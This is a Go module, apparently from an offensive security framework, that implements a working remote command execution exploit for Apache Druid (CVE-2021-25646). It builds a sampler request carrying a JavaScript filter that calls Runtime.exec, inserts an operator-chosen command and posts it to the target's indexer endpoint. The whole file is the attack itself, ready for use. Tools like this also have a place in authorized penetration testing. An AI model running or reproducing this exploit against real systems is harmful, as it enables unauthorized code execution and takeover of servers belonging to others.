package exp_Druid

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_CVE_2021_25646 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_25646) Attack_cmd1() (expResult exp_model.ExpResult) {
	//获取header
	headers := self.GetInitExpHeaders()
	//设置格式
	headers.Set("Content-Type", "application/json")
	//设置poc
	payload := `{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript","function":"function(value){return java.lang.Runtime.getRuntime().exec('l1ang')}","dimension":"added","":{"enabled":"true"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000,"cacheKey":""}}`
	//替换poc
	payload = strings.Replace(payload, "l1ang", self.MustGetStringParam("cmd"), 1)
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/druid/indexer/v1/sampler?for=filter"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		self.EchoSuccessMsg("执行失败，请检查命令执行结果！")
		return
	}
	self.EchoSuccessMsg("执行成功，请检查命令执行结果！")
	return expResult
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2021_25646{}, "exp_CVE-2021-25646.yml")
}
